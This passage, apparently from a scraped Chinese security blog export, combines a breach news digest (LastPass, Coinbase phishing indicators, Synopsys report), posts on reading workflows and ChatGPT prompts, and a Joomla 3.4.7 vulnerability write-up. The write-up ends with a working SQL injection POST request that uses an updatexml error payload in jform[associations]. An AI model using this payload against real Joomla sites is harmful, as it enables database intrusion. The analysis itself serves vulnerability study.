https://www.hackread.com/hackers-godaddy-source-code-data-breach/\r\n- https://aboutus.godaddy.net/newsroom/company-news/news-details/2023/Statement-on-recent-website-redirect-issues/default.aspx\r\n\r\n### LastPass用户数据遭窃：关键运维员工遭定向攻击，内部安全控制失效\r\n2023年2月28日，LastPass日前公布了去年遭受“二次协同攻击”事件的更多信息，发现恶意黑客潜伏在其内网长达两个月的时间内，持续访问并窃取了亚马逊AWS云存储中的数据。\r\n\r\nLastPass在去年12月透露，恶意黑客窃取到部分加密的密码保险库数据和客户信息。现在，该公司进一步解释了恶意黑客的攻击实施方法，称对方使用到了去年8月首次入侵时窃取的信息，还利用一个远程代码执行漏洞，在一名高级DevOps工程师的计算机上安装了键盘记录器。\r\n\r\nLastPass表示，二次协同攻击利用到了首轮违规中外泄的数据，并访问了该公司经过加密的Amazon S3存储桶。\r\n\r\nLastPass公司只有4位DevOps工程师有权访问这些解密密钥，因此恶意黑客将矛头指向了其中一名工程师。最终，黑客利用第三方媒体软件包中的远程代码执行漏洞，在该员工的设备上成功安装了键盘记录器。\r\n\r\n “恶意黑客成功获取了员工在完成多因素身份验证（MFA）后输入的主密码（master password），借此获得了该DevOps工程师对LastPass企业密码保险库的访问权。”LastPass日前发布的最新安全警告称。\r\n\r\n“恶意黑客随后导出了共享文件夹中的本地企业密码保险库条目和内容，其中包括能够访问LastPass AWS S3生产备份、其他云存储资源以及部分相关重要数据库备份的安全注释和加密密钥。”\r\n\r\n由于恶意黑客窃取并使用了有效的访问凭证，LastPass的调查人员很难检测到对方活动，导致其顺利从LastPass的云存储服务器处访问并窃取到大量数据。恶意黑客甚至持续驻留达两个月以上，从2022年8月12日一直到2022年10月26日。\r\n\r\n直到恶意黑客尝试用云身份和访问管理（IAM）角色执行未授权操作时，LastPass才最终通过AWS GuardDuty警报检测到这些异常行为。\r\n\r\n该公司表示，他们已经更新了安全机制，包括对敏感凭证及身份验证密钥/令牌进行轮换、撤销证书、添加其他记录与警报，以及执行更严格的安全策略等。\r\n\r\n#### 大量数据已被访问\r\n\r\n作为此次披露的一部分，LastPass还发布了关于攻击中哪些客户信息遭到窃取的具体说明。\r\n\r\n根据特定客户的不同，失窃数据的范围很广且内容多样，包括多因素身份验证（MFA）种子值、MFA API集成secreet，以及为联合企业客户提供的Split Knowledge组件（K2）密钥。\r\n\r\n以下是被盗数据内容的基本概括，更详细的失窃信息说明请参阅LastPass支持页面（https://support.lastpass.com/help/what-data-was-accessed）。\r\n\r\n#### 事件1中被访问的数据汇总\r\n- 云端按需开发和源代码仓库——包括全部200个软件代码仓库中的14个。\r\n- 来自各代码仓库的内部脚本——其中包含LastPass secrets和证书。\r\n- 内部文档——描述开发环境运作方式的技术信息。\r\n\r\n#### 事件2中被访问的数据汇总\r\nDevOps secrets——用于访问我们云端备份存储的受保护secrets。\r\n\r\n云备份存储——包含配置数据API secrets、第三方集成secrets客户元数据，以及所有客户保险库数据的备份。除URL、用于安装LastPass Windows/macOS版软件以及涉及邮件地址的特定用例之外，全部敏感客户保险库数据均通过“零知识架构”进行加密，且只能通过各用户主密码提供的唯一加密密钥实现解密。请注意，LastPass永远不会获取最终用户的主密码，也不会存储或持有主密码——因此，泄露数据中不涉及任何主密码。\r\n\r\nLastPass MFA/联邦数据库备份——包含LastPass Authenticator的种子值副本，作为MFA备份选项（如果启用）的电话号码，以及供LastPass联邦数据库（如果启用）使用的Split Knowledge组件（即K2「密钥」）。该数据库经过加密，但在第二次违规事件中，恶意黑客窃取了单独存储的解密密钥。\r\n\r\n本次发布的支持公告还相当“隐蔽”，由于LastPass公司在公告页面的HTML标签添加了`<meta name=\"robots\" content=\"noindex\">`，因此该页面无法通过搜索引擎直接检索。\r\n\r\nLastPass还发布一份题为“安全事件更新与建议操作”的PDF文档，其中包含关于违规和失窃数据的更多信息。\r\n![RhY2wU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/RhY2wU.png)\r\n\r\n该公司也整理了支持文件，面向免费、付费和家庭客户以及LastPass Business管理员提供应对建议。\r\n\r\n通过公告中的建议操作，应可进一步保障您的LastPass账户与相关集成。\r\n\r\n#### 参考资料\r\n- https://mp.weixin.qq.com/s/zvrwVei6Jy-zEDTkks7Ptg\r\n- https://arstechnica.com/information-technology/2023/02/lastpass-hackers-infected-employees-home-computer-and-stole-corporate-vault/\r\n- https://blog.lastpass.com/2023/03/security-incident-update-recommended-actions/\r\n\r\n\r\n### Coinbase遭受钓鱼攻击，但被成功阻止\r\n\r\n我们的故事开始于 2023 年 2 月 5 日星期日的深夜。几位员工的手机开始提醒短信，表明他们需要通过提供的链接紧急登录以接收重要消息。虽然大多数人会忽略这条自发的消息 - 一名员工认为这是一条重要且合法的消息，点击链接并输入他们的用户名和密码。 “登录”后，系统会提示员工忽略该消息并感谢遵守。\r\n\r\n接下来发生的事情是，攻击者配备了合法的 Coinbase 员工用户名和密码，反复尝试远程访问 Coinbase。幸运的是，我们的网络控制已经准备就绪。攻击者无法提供所需的多因素身份验证 (MFA) 凭据，因此无法获得访问权限。在许多情况下，这将是故事的结局。但这不仅仅是任何攻击者。我们认为此人与自去年以来一直以数十家公司为目标的高度持久和复杂的攻击活动有关。\r\n\r\n大约 20 分钟后，我们员工的手机响了。攻击者自称来自 Coinbase 公司信息技术 (IT)，他们需要该员工的帮助。该员工认为他们正在与合法的 Coinbase IT 员工交谈，因此登录到他们的工作站并开始按照攻击者的指示进行操作。这开始了攻击者和一名越来越可疑的员工之间的来回。随着谈话的进行，这些要求变得越来越可疑。幸运的是，没有资金被盗用，也没有客户信息被访问或查看，但我们员工的一些有限联系信息被盗用，特别是员工姓名、电子邮件地址和一些电话号码。\r\n\r\n幸运的是，我们的计算机安全事件响应小组 (CSIRT) 在攻击发生后的前 10 分钟内就解决了这个问题。我们的 CSIRT 收到安全事件和事件管理 (SIEM) 系统的异常活动警报。此后不久，我们的一名事件响应人员通过我们的内部 Coinbase 消息系统联系了受害者，询问与他们的账户相关的一些异常行为和使用模式。意识到事情严重错误后，该员工终止了与攻击者的所有通信。\r\n\r\n我们的 CSIRT 团队立即暂停受害员工的所有访问权限并展开全面调查。由于我们的分层控制环境，没有资金损失，也没有客户信息被泄露。清理工作相对较快，但仍然——这里有很多教训要吸取。\r\n\r\n#### 披露的一些TTPs\r\n\r\n**钓鱼站点域名：**\r\n- sso-*.com\r\n- *-sso.com\r\n- login.*-sso.com\r\n- dashboard-*.com\r\n- *-dashboard.com\r\n\r\n**来自以下厂商的来电/短信：**\r\n- Google Voice\r\n- Skype\r\n- Vonage/Nexmo\r\n- Bandwidth.com\r\n\r\n**使用了以下浏览器扩展：**\r\n- [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)\r\n\r\n**从第三方 VPN 提供商（特别是 Mullvad VPN）访问您的组织的任何尝试。**\r\n\r\n**使用第三方服务riseup[.]net来复制粘贴数据（可用于数据外传）**\r\n\r\n**以下远程桌面工具：**\r\n- AnyDesk (anydesk.com)\r\n- ISL 在线 (islonline.com)\r\n\r\n#### 参考资料\r\n- https://www.coinbase.com/blog/social-engineering-a-coinbase-case-study\r\n\r\n## 安全报告\r\n### Synopsys 2023 开源安全与风险分析报告\r\n\r\n> 存在漏洞的开源代码库比例继续保持近两年水平，但存在高危漏洞的应用数量已降至四年来的最低水平。\r\n\r\n这是根据 Synopsys 于 2 月 22 日发布的“2023 开源安全和风险分析”(OSSRA) 报告得出的结论。该年度研究基于对 1,700 多个应用程序的审核，发现几乎每个软件程序 (96%) 都包含某种开源软件组件，平均代码库包含 76% 的开源代码。虽然至少存在一个漏洞的代码库数量在过去三年中基本保持稳定，略高于 80%（2022 年为 84%），但具有高风险漏洞的应用程序数量已下降至约一半 (48%)测试的应用程序，从 2020 年约 60% 的峰值开始。\r\n\r\nSynopsys Software Integrity Group 的高级软件解决方案经理 Mike McGuire 表示，总体而言，数据显示了在与易受攻击的依赖项的斗争中的一些亮点，其中平均每个应用程序有 595 个，但没有提高应用程序安全性的广泛趋势。\r\n\r\n![gqIKuR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/gqIKuR.jpg)\r\n\r\n开源组件以及流行应用程序框架所依赖的依赖项继续为软件制造商和应用程序开发人员带来安全问题。一些组件的普遍存在——例如 Java 生态系统中的 Log4j——继续导致许多基于开源框架的应用程序出现安全问题。\r\n\r\n包含大量组件（以及这些组件的依赖项）的应用程序可能具有很深的依赖关系树，这使得很难找到每个漏洞。例如，几乎所有应用程序 (91%) 都包含至少一个在过去两年内没有开发的开源组件，这可能表明该项目不再维护，因此存在安全风险。\r\n\r\n报告称，其他行业已经减少了对开源软件的使用，可能是通过将更少的项目整合为依赖项。互联网和软件基础设施部门以及电信和无线部门都已将开源软件对其代码库的贡献减少到 60% 以下。这两个行业的高危漏洞也较少。\r\n\r\n#### 参考资料\r\n- https://news.synopsys.com/2023-02-22-Synopsys-Study-Underscores-Need-for-Comprehensive-SBOM-as-Best-Defense-in-Software-Supply-Chain-Security\r\n- https://www.synopsys.com/software-integrity/resources/analyst-reports/open-source-security-risk-analysis.html?cmp=pr-sig&utm_medium=referral\r\n"},{"fields":{"slug":"/知识管理/阅读学习工作流/","title":"阅读学习工作流"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 阅读学习工作流\r\ntags:\r\n - 知识管理\r\n---\r\n\r\n# 前言\r\n> 大多数人会对自己的记忆力过分高估。这个幻觉来自每时每刻都有一些确实可以记得住的东西，而记不住的东西恰恰则因为没有被记住所以看上去“并不存在”。换言之，每时每刻都有“我记得住”的证据，而“我记不住”的证据基本上难觅其踪。这也就是为什么总有那么多人真诚地相信自己考试成绩差是因为“没发挥好”。\r\n> 相信自己的记忆力比自己估计得差（甚至差很多）是一个去除这一幻觉的行之有效的方法，因为只有相信这个事实，才能够在倾听的时候有意识地为了真正记住而反复（认真）回顾。在一些重要场合（课堂、会议等），也会因此真诚地借助辅助工具（笔记、照片、录音等）来帮助记忆。很多人从小就对老师“一定要记笔记”的建议置若罔闻，准确地讲，这种行为并非出自对老师的忽视或者鄙视，而是出自对自己记忆力“幻觉”的信任。\r\n> \r\n> ——《把时间当作朋友》\r\n\r\nFrom [time-as-a-friend/Chapter6.md at master · xiaolai/time-as-a-friend](https://github.com/xiaolai/time-as-a-friend/blob/master/Chapter6.md)\r\n每天我都会在碎片化的时间听到、看到、读到各种信息，而绝大部分内容却成为过眼烟云，唯一的收获便是让我产生学到了很多东西的幻觉。即使把这些信息存入笔记软件，也会陷入「收藏即学习」的陷阱，绝大部分知识收藏的内容收藏之后，再也没有打开。\r\n\r\n> 「收藏即学习」的陷阱可以尝试使用费曼学习法来破局，建立正向反馈机制，实现从收藏者到创作者的转变。\r\n\r\n为了解决前面提到的困境，我读了很多关于个人知识管理有关的书籍和文章，结合自己的需求，创建了自己的阅读学习工作流。\r\n\r\n# 整体流程\r\n工作流包括三个模块：**获取信息、阅读信息和整理输出**，利用输入强化输出，输出倒逼输入，践行[费曼学习法](https://www.liaolijun.com/feynman-technique/)，其中每个模块附上了我常用的工具，供参考。\r\n\r\n![Created by draw.io](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/TBhwNH.jpg)\r\n## 获取信息\r\n| 类型       | 获取周期 | 订阅工具 | 存储工具     | 推荐阅读                |\r\n| ---------- | -------- | -------- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\r\n| RSS        | 每日     | Feedly   | Notion       | [不那么完美的 RSS 订阅方案 — feedly + RSSHub](https://sspai.com/post/59501)                                                                                                                                                                  |\r\n| Newsletter | 每周     | Matter   | Notion       | [试用 iOS 上的阅读应用 Matter](https://sspai.com/post/68585)                                                                                                                                                                                 |\r\n| Podcast    | 每周     | Spotify  | Siyuan       | [THE RISE OF PODCASTS AND WHAT SPOTIFY HAS TO DO WITH IT](https://epic-tv.com/events/blog/the-rise-of-podcasts-and-what-spotify-has-to-do-with-it/#:~:text=Spotify%20uses%20podcasting%20to%20help,series%20that%20ran%20throughout%202018.) |\r\n| 书籍       | 每周     | 人肉     | Siyuan       | [“无离线不笔记”为什么我要选择思源笔记？](https://zhuanlan.zhihu.com/p/399935581)                                                                                                                                                             |\r\n| 公众号     | 碎片时间 | 微信     | 简约, Notion | [建立强大的 Notion 数据库，从了解函数开始](/3f1e9e5c14b24df69aa9c3b3334381f1)                                                                                                                                                                |\r\n| Twitter           |     碎片时间     |    Twitter      |     简约, Notion         |                    N/A                                                                                                                                                                                                                          |\r\n|     网页      |     碎片时间     |    Google     |       简约, Notion     |           [阅读模式 + 标注系统 + 稍后读，简悦 2.0 想成为你的知识管理解决方案](https://sspai.com/post/61996)                                                                                                                                                                                                                                   |\r\n|     灵机一动       |    碎片时间      |     Flomo     |      Flomo, Notion, Siyuan        |          [flomo 浮墨笔记的背后，藏着什么样的理念](https://sspai.com/post/64009)                                                                                                                                                                                                                                    |\r\n在获取信息阶段，相关的数据源就不赘述了，重点讲讲几个工具：\r\n\r\n1. Feedly\r\n    主流的RSS订阅软件使用起来差别不大，选择自己顺手的就行。\r\n2. Matter\r\n    可以使用Matter提供的邮箱来订阅Newsletter，在移动端用户体验还不错。\r\n3. Spotify\r\n    为了听墙外的podcast节目，且大部分的podcast都会在Spotify分发。（Spotify国内可以正常使用）\r\n4. Flomo\r\n    软件功能简单，输入摩擦很小，设计让人有动力开始记录，也非常钦佩创始人[少楠](https://www.notion.so/Plidezus-ff9bdac2b40e4ad2be23192a8c43f5fd)。\r\n\r\n## 阅读和笔记\r\n\r\n在这个阶段，我以Siyuan (思源笔记)为核心，对各种信息进行阅读、学习、整理，采用**Zettelkasten卡片盒笔记法**（[可以参考这篇文章](https://sspai.com/post/60802)）来对知识点进行卡片化和相互连接，在daily note中写自由写作（而无需关心笔记分类），结合双链的方式让笔记自然生长。\r\n\r\n在阅读的过程中，批注是很自然的事，**简悦**的主打功能**”阅读模式 + 剪藏 + 标注“**很好的实现了这一点，真正提升了网页阅读的效能，可以说是生产力工具。\r\n\r\n将**简悦**剪藏的网页+标注通过API自动导入**Notion**后，在写作/使用时，就能在**Notion**使用全局搜索，快速找到所需要的资料。（Pocket/Instapper还需要开通会员才能全文检索）\r\n\r\n这个时候我使用的工具如下：\r\n\r\n1. Notion\r\n    核心优势是强大的Database功能，非常适合做数据的整理、统计和关联等功能，同时也支持页面分享和多人协作，本站其实就是Notion分享的Page；但数据存在云端，对数据安全有疑虑的同学不建议使用。\r\n2. Siyuan (思源笔记)\r\n    双链笔记软件非常多，我也体验过近两年火爆的Roam research、Obsidian和Logseg之类的笔记软件，最终选择思源笔记的原因有两个：一、大纲+Block的写作方式更加自由。二、本地化社区支持，开发者[D](https://github.com/88250)和[V](https://github.com/Vanessa219)会经常答疑。三、数据本地存储更加安全，云端存储可端到端加密。\r\n3. 简悦\r\n    沉浸式阅读体验，强大的划词批注功能，还能打通其他生产力工具（如Notion）。\r\n\r\n## 整理输出\r\n\r\n我会使用Siyuan (思源笔记) 完成最终的输出过程，并将完成的文章整理到Notion，在Notion强大的Database功能加持下，在Notion做知识整理体验非常愉悦；可以体验下少楠的[产品沉思录](https://pmthinking.com)。\r\n\r\n# 最后\r\n\r\n引用工作流的祛魅：从工具、阅读到写作](https://sspai.com/post/71658)中写到的内容作为结尾：\r\n\r\n第一，在工作流中，**实践先行，理念优先于工具**。不过，关于工作流纯理念性的论述力有不逮，整篇文章依然主要围绕工具和技术加以展开。另外，高效率的工作流设计和运行还会涉及**注意力管理、时间管理或者精力管理**等维度，这些内容也是需要加以进一步考虑的。\r\n第二，**可能会过于拔高工作流的重要性**。如果使用场景比较单一，需要一个人集中精力完成单个简单项目的时候，那么先行动起来更好，不需要刻意在意工作流。如果处理工作流的精力成本超过了工作本身，那么先停止折腾工作流，在工作实践中你会逐步加深对于自己工作流的认知。\r\n第三，一个合适的工作流对于个人和团队而言自然重要，然而同时也**需要注意到工作流是一种中微观的战术策略。在工作流之外，也需要使用一些更为宏观的战略方案加以支撑**。比如，个体需要及时更新思维方式，企业需要建立合适的组织架构。\r\n第四，这条**通往效率生活之路并没有止境**，理想的效率与生活本身处于**动态平衡**之中。偶尔休息，回头看看甚至退几步也未尝不是好事。\r\n\r\n共勉。"},{"fields":{"slug":"/博客/2022/ChatGPT来临，未来我们可能只需要Prompt工程师：如何制作清晰有效的Prompt/","title":"ChatGPT来临，未来我们可能只需要Prompt工程师：如何制作清晰有效的Prompt"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ChatGPT来临，未来我们可能只需要Prompt工程师：如何制作清晰有效的Prompt\r\ntags:\r\n  - 博客\r\n  - ChatGPT\r\n  - Prompt\r\n---\r\n\r\n# 背景\r\n\r\nChatGPT 的主要优点之一是它能够理解和响应自然语言输入。这意味着用户可以使用与人类交谈时使用的相同语言和语法与 ChatGPT 进行通信。ChatGPT 还能够理解和响应上下文，使其能够对用户输入生成更合适和更相关的响应。\r\n除了自然语言处理功能外，ChatGPT 还具有许多其他特性和功能，使其成为推动对话的强大工具。其中包括：\r\n\r\n- **定制：**ChatGPT可以定制以满足用户的需求和偏好。这可以包括自定义 ChatGPT 回复的语气和风格，以及它能够讨论的信息和主题类型。\r\n- **个性化：**ChatGPT 可以使用机器学习算法根据用户过去的交互和偏好个性化其响应。这可以使对话感觉更自然，并根据用户的需求和兴趣量身定制。\r\n- **多语言支持：**ChatGPT能够理解和响应多种语言的输入，使其成为国际用户或想要用多种语言交流的用户的有用工具。\r\n- **可扩展性：**ChatGPT 能够处理大量流量，并可用于同时推动与多个用户的对话。这使其非常适合客户服务或在线社区等应用程序。\r\n\r\n# 理论\r\n\r\n## 什么是Prompt\r\n\r\n> 在 ChatGPT 中，Prompt 指的是用户输入或提供给模型的初始文本或提示，它可以是一个问题、一个短语、一个句子或一整段文字。模型会根据这个 Prompt 来生成一个回复或者完成一个任务。Prompt 往往会对模型的生成结果产生重要的影响，因此在使用 ChatGPT 时，合理设计 Prompt 是非常重要的。\r\n>\r\n> —— by ChatGPT\r\n\r\n## Prompt在 Chat GPT 对话中的作用\r\n\r\n正如我们前面提到的，ChatGPT 对话中使用的提示质量会显著影响对话的成功。定义明确的提示有助于确保对话保持正常并涵盖用户感兴趣的主题，从而提供更具吸引力和信息丰富的体验。\r\n那么，什么是好的 ChatGPT 提示，您如何制作有效的提示来推动引人入胜且信息丰富的对话？有几个关键原则需要牢记：\r\n\r\n- **清晰：**清晰简洁的提示将有助于确保 ChatGPT 了解手头的主题或任务，并能够生成适当的响应。避免使用过于复杂或模棱两可的语言，并在提示中尽可能具体。\r\n- **重点：**定义明确的提示应具有明确的目的和重点，有助于指导对话并保持对话正常进行。避免使用过于宽泛或开放式的提示，这可能会导致对话脱节或注意力不集中。\r\n- **关联：**确保您的提示与用户和对话相关。避免引入不相关的话题或切线，以免分散对话的主要焦点。通过遵循这些原则，您可以制作有效的 ChatGPT 提示，以推动引人入胜且信息丰富的对话。\r\n\r\n## 有效和无效的 ChatGPT Prompt示例\r\n\r\n**有效的聊天GPT提示：**\r\n\r\n- **“你能总结一下'运动的好处'一文的要点吗？”**——此提示重点突出且相关，使 ChatGPT 可以轻松提供请求的信息。\r\n- **“巴黎最好的素食餐厅是什么？”**——此提示是特定且相关的，允许 ChatGPT 提供有针对性和有用的响应。\r\n\r\n**无效的聊天GPT提示：**\r\n\r\n- **\"你能告诉我关于这个世界的什么？”**——此提示过于宽泛和开放，使 ChatGPT 难以生成,重点突出或有用的响应。\r\n- **“你能帮我做作业吗？”**——虽然此提示清晰而具体，但它过于开放，无法让 ChatGPT 生成有用的响应。更有效的提示将指定手头的特定主题或任务。\r\n- **“你怎么样？”**——虽然这是一个常见的对话开始，但它不是一个定义明确的提示，也没有为对话提供明确的目的或重点。\r\n\r\n## 如何清晰地告诉ChatGPT需要做什么呢？\r\n\r\n可以尝试以下包含以下的五个元素：\r\n\r\n- 背景，由于模型通用性很强，因此明确交流的背景很重要，从而让模型能够进入目标**角色**。\r\n- 任务，指定期望的**结果**或**目标**，让模型聚焦，防止其跑题或包含很多不相关内容。\r\n- 说明，概述任务之后，最好再提供详细的说明。如帖子的整体基调、长度、目标受众等。\r\n- 确认，确认模型是否理解了背景、任务和说明。\r\n- 调整，因为模型可以在一定范围内记住会话的上下文，所以当没有获得预期结果时，无需重写完整提示。\r\n\r\n### 案例\r\n\r\n![HSLewu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/HSLewu.jpg)\r\n\r\n# 参考资料\r\n\r\n- [ChatGPT提问的艺术 - 掘金 (juejin.cn)](https://juejin.cn/post/7204739332174102588)\r\n- [Awesome ChatGPT Prompts | This repo includes ChatGPT prompt curation to use ChatGPT better.](https://prompts.chat/)\r\n- https://github.com/dair-ai/Prompt-Engineering-Guide"},{"fields":{"slug":"/博客/Archive/Joomla 3.4.7 修复的反序列化与SQL注入/","title":"Joomla 3.4.7 修复的反序列化与SQL注入"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Joomla 3.4.7 修复的反序列化与SQL注入\r\ntags:\r\n  - 博客\r\n  - web安全\r\n  - SQL注入\r\n  - 反序列化\r\norder: 10000\r\n---\r\n\r\n## 反序列化漏洞修复分析\r\n\r\n前一阵子 Joomla 的对象注入很火，而官方3.4.6的修复仅仅是严格过滤了X_FORWARDED_FOR、注释了USER_AGENT存入SESSION那一句，见[这里](https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021),这样只是指哪补哪，治标不治本。看来官方上次的修复只是临时解决方案，这次的更新(3.4.7)算是彻底解决了此问题。\r\n\r\n上次的对象注入，需要满足三个条件：\r\n\r\n1. 自己实现session的处理方式，重新实现了 session 存储的read()和write()方法，但是并没有对 session 的值进行安全处理。\r\n2. Mysql非strict mode下，使用utf8mb4字符 `\\xF0\\x9D\\x8C\\x86` 来截断。\r\n3. PHP <= 5.6.13 session中反序列化解析的BUG。\r\n\r\nJoomla 官方也只能解决第一个，也就是改进session的处理方式。这次更新，在 libraries/cms/version/version.php 中，将SESSION存储在内部的Registry类对象中，弃用了以前使用 $_SESSION[$namespace][$name] 的方式：\r\n\r\n```php\r\n$this->data = new \\Joomla\\Registry\\Registry;\r\n```\r\n\r\n并且，在写SESSION的时候会先做base64_encode：\r\n\r\n```php\r\npublic function close(){\r\n\tif ($this->_state !== 'active'){\r\n\t\t// @TODO :: generated error here\r\n\t\treturn false;\r\n\t}\r\n\t$session = JFactory::getSession();\r\n\t$data    = $session->getData();\r\n\r\n\t// Before storing it, let's serialize and encode the JRegistry object\r\n\t$_SESSION['joomla'] = base64_encode(serialize($data));\r\n\r\n\tsession_write_close();\r\n\treturn true;\r\n}\r\n```\r\n\r\n这样，$_SESSION 就只剩下了$_SESSION[‘joomla’]，而且$_SESSION[‘joomla’] 只存储了Registry的对象$data，在执行read()和write()时候，SESSION是经过base64_encode后的数据，就不会存在read()之后自动反序列化而导致对象注入了。\r\n\r\n在反序列化的时候也不存在unserialize参数可控的情况。（可控的只是$data的成员变量）\r\n\r\n```php\r\nif (isset($_SESSION['joomla']) && !empty($_SESSION['joomla'])){\r\n    $data = $_SESSION['joomla'];\r\n    $data = base64_decode($data);\r\n    $this->data = unserialize($data);\r\n}\r\n```\r\n\r\nJoomla官方这次的解决方案比较好，不像上次那样治标不治本，这样的态度值得称赞。反观Apache对struts2 漏洞的修复…就不说了。\r\n\r\n## SQL注入漏洞分析\r\n\r\n### 漏洞分析\r\n\r\n代码位于，administrator/components/com_categories/models/category.php，save()函数内：\r\n\r\n```php\r\n$assoc = $this->getAssoc();\r\n\r\nif ($assoc)\r\n{\r\n\t// Adding self to the association\r\n\t$associations = $data['associations'];\r\n\r\n\tforeach ($associations as $tag => $id)\r\n\t{\r\n\t\tif (empty($id))\r\n\t\t{\r\n\t\t\tunset($associations[$tag]);\r\n\t\t}\r\n\t}\r\n\r\n\t// Detecting all item menus\r\n\t$all_language = $table->language == '*';\r\n\r\n\tif ($all_language && !empty($associations))\r\n\t{\r\n\t\tJError::raiseNotice(403, JText::_('COM_CATEGORIES_ERROR_ALL_LANGUAGE_ASSOCIATED'));\r\n\t}\r\n\r\n\t$associations[$table->language] = $table->id;\r\n\r\n\t// Deleting old association for these items\r\n\t$db = $this->getDbo();\r\n\t$query = $db->getQuery(true)\r\n\t\t->delete('#__associations')\r\n\t\t->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))\r\n\t\t->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');\r\n\t$db->setQuery($query);\r\n\t$db->execute();\r\n\r\n\tif ($error = $db->getErrorMsg())\r\n\t{\r\n\t\t$this->setError($error);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tif (!$all_language && count($associations))\r\n\t{\r\n\t\t// Adding new association for these items\r\n\t\t$key = md5(json_encode($associations));\r\n\t\t$query->clear()\r\n\t\t\t->insert('#__associations');\r\n\r\n\t\tforeach ($associations as $id)\r\n\t\t{\r\n\t\t\t$query->values($id . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));\r\n\t\t}\r\n\r\n\t\t$db->setQuery($query);\r\n\t\t$db->execute();\r\n\r\n\t\tif ($error = $db->getErrorMsg())\r\n\t\t{\r\n\t\t\t$this->setError($error);\r\n\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n}\r\n```\r\n\r\n其中的 $associations 未经过适当处理、我们跟着流程来看看。\r\n\r\n首先，`$assoc = $this->getAssoc();` 为 True 的时候整个逻辑才能进来，这个`getAssoc()`是什么呢？跟进getAssoc()的实现(文件的 1234 行)，发现关键是在：\r\n\r\n```php\r\n$assoc = JLanguageAssociations::isEnabled();\r\n```\r\n\r\n搜索一下，发现 JLanguageAssociations 是 Joomla 的一个多语言插件 [http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler](http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler), 这个插件是 Joomla 自带的，默认没有开启，我们在后台将他开启。\r\n\r\n然后，继续看代码，`$associations = $data['associations'];`, $data是post过来的数据，$associations没有经过过滤就传到了：\r\n\r\n```php\r\n$query = $db->getQuery(true)\r\n\t\t\t\t->delete('#__associations')\r\n\t\t\t\t->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))\r\n\t\t\t\t->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');\r\n```\r\n\r\n导致SQL注入。\r\n\r\n那 Joomla 有没有全局过滤呢？我们看看 Joomla 是如何处理POST数据的。\r\n\r\n在 libraries/legacy/controller/form.php , save() 函数，\r\n\r\n```php\r\npublic function save($key = null, $urlVar = null){\r\n    ...\r\n    $data  = $this->input->post->get('jform', array(), 'array');\r\n    ...\r\n    $validData = $model->validate($form, $data);\r\n```\r\n\r\nvalidate() 函数在 libraries/legacy/model/form.php 302行, 他又调用了libraries/joomla/form/form.php 的filter() 函数，具体实现就不继续了，总之这里的POST参数只是处理了 ‘ XSS and specified bad code. ‘。\r\n\r\n最后，构造POC。在修改分类，保存的时候，修改POST数据:\r\n\r\n```php\r\nPOST /Joomla/administrator/index.php?option=com_categories&extension=com_content&layout=edit&id=19\r\n\r\njform[title]=Joomla!&jform[alias]=joomla&jform[description]=&jform[parent_id]=14&jform[published]=1&jform[access]=1&jform[language]=*&jform[note]=&jform[version_note]=&jform[created_time]=2011-01-01+00:00:01&jform[created_user_id]=945&jform[modified_time]=2015-12-23+08:09:46&jform[modified_user_id]=945&jform[hits]=0&jform[id]=19&jform[metadesc]=&jform[metakey]=&jform[metadata][author]=&jform[metadata][robots]=&jform[associations][en-GB]=2) or updatexml(1,concat(0x7e,(version())),0) -- -&jform[rules][core.create][1]=&jform[rules][core.delete][1]=&jform[rules][core.edit][1]=&jform[rules][core.edit.state][1]=&jform[rules][core.edit.own][1]=&jform[rules][core.create][13]=&jform[rules][core.delete][13]=&jform[rules][core.edit][13]=&jform[rules][core.edit.state][13]=&jform[rules][core.edit.own][13]=&jform[rules][core.create][6]=&jform[rules][core.delete][6]=&jform[rules][core.edit][6]=&jform[rules][core.edit.state][6]=&jform[rules][core.edit.own][6]=&jform[rules][core.create][7]=&jform[rules][core.delete][7]=&jform[rules][core.edit][7]=&jform[rules][core.edit.state][7]=&jform[rules][core.edit.own][7]=&jform[rules][core.create][2]=&jform[rules][core.delete][2]=&jform[rules][core.edit][2]=&jform[rules][core.edit.state][2]=&jform[rules][core.edit.own][2]=&jform[rules][core.create][3]=&jform[rules][core.delete][3]=&jform[rules][core.edit][3]=&jform[rules][core.edit.state][3]=&jform[rules][core.edit.own][3]=&jform[rules][core.create][4]=&jform[rules][core.delete][4]=&jform[rules][core.edit][4]=&jform[rules][core.edit.state][4]=&jform[rules][core.edit.own][4]=&jform[rules][core.create][5]=&jform[rules][core.delete][5]=&jform[rules][core.edit][5]=&jform[rules][core.edit.state][5]=&jform[rules][core.edit.own][5]=&jform[rules][core.create][10]=0&jform[rules][core.delete][10]=&jform[rules][core.edit][10]=&jform[rules][core.edit.state][10]=&jform[rules][core.edit.own][10]=&jform[rules][core.create][12]=0&jform[rules][core.delete][12]=&jform[rules][core.edit][12]=&jform[rules][core.edit.state][12]=&jform[rules][core.edit.own][12]=&jform[rules][core.create][8]=&jform[rules][core.delete][8]=&jform[rules][core.edit][8]=&jform[rules][core.edit.state][8]=&jform[rules][core.edit.own][8]=&jform[params][category_layout]=&jform[params][image]=&jform[params][image_alt]=&jform[extension]=com_content&task=category.apply&2ebbc80d46dda42570c1b1699a58323d=1